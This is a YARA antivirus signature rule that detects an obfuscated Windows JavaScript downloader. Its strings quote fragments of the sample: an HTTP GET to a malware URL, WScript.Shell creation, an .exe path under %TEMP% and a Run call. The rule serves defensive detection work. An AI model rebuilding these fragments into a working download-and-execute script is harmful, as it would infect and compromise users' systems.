rule sig_20160401_7d850f8aecf272f93ec874c7d6b2513d {
  meta:
    description = "datamaliciousorder - file 20160401_7d850f8aecf272f93ec874c7d6b2513d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4e584e1ab7a943fe1ea55cabb0a658231e2ce23690332b6c28000c7ed2e271bc"

  strings:
    $s1  = "RvGwx[ErMn](\"G\" + \"ET\", \"http://sirplusalot.net/l1pasw\", false);" fullword ascii
    $s2  = "var MthMph = function DtwYao() {return WScript[UikHlj](\"WScript\"+\".Shell\");}(), LuaKo = 11;" fullword ascii
    $s3  = "function OxvJgo(ZrDo, QicRjs){XnZw = XnZw * 1; return ZrDo - QicRjs;};" fullword ascii
    $s4  = "if (RvGwx[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NrhQxp(){return GnyRh + \"\";};" fullword ascii
    $s6  = "function NtOl() {return MthMph[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"WU23pz1R09Q.ex\" + \"e\";};" fullword ascii
    $s7  = "function BstDa() {return ((VmBw == true) && (VmBw == DchRdf)) ? 1 : XnZw;};" fullword ascii
    $s8  = "var VmBw = false;" fullword ascii
    $s9  = "var JoKwt = new this[\"Date\"]();" fullword ascii
    $s10 = "function YdLw(){return UikHlj;};" fullword ascii
    $s11 = "function GfWf(YzeYdi){MthMph[\"R\"+\"un\"](YzeYdi, XnZw, XnZw);};" fullword ascii
    $s12 = "DchRdf = true; " fullword ascii
    $s13 = "var DchRdf = false;" fullword ascii
    $s14 = "function KcPxb(){return 23;};" fullword ascii
    $s15 = "function UfSc()" fullword ascii
    $s16 = "VmBw = true; " fullword ascii
    $s17 = "var AdYz = false;" fullword ascii
    $s18 = "}while (JnOv);" fullword ascii
    $s19 = "function WqnQv(LjaIq) {var CqLd = (1, 2, 3, 4, 5, LjaIq); return CqLd;};" fullword ascii
    $s20 = "return OxvJgo(RmsTu, HeYpw);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}